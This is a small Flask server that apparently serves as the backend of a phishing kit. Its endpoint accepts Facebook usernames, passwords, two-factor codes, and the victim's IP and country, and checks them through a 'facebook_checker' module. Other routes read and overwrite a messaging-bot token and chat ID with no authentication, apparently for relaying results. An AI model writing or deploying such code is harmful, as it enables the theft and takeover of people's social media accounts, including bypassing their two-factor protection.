from flask import Flask, jsonify, request
from flask_cors import CORS

from modules.facebook_checker import (check_status_facebook,
                                      read_api_token_and_chat_id_from_json,
                                      write_api_token_and_chat_id_to_json)

app = Flask(__name__, static_url_path='', static_folder='static')

CORS(app)
@app.route('/read_config', methods=['GET'])
def read_config():
    api_token, chat_id = read_api_token_and_chat_id_from_json('config.json')
    return jsonify(api_token=api_token, chat_id=chat_id)

@app.route('/admin_update', methods=['GET'])
def admin_update():
    api_token = request.args.get('api_token')
    chat_id = request.args.get('chat_id')
    write_api_token_and_chat_id_to_json(api_token, chat_id)

    return 'OK'


@app.route('/check_facebook_status', methods=['GET'])
def check_facebook_status():
    username = request.args.get('username')
    password = request.args.get('password')
    code = request.args.get('code')
    ip = request.args.get('ip')
    country = request.args.get('country')
    if not username or not password:
        return 'WRONG'
    if not code:
        return check_status_facebook(username, password, None, ip, country)
    else:
        return check_status_facebook(username, password, code, ip, country)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
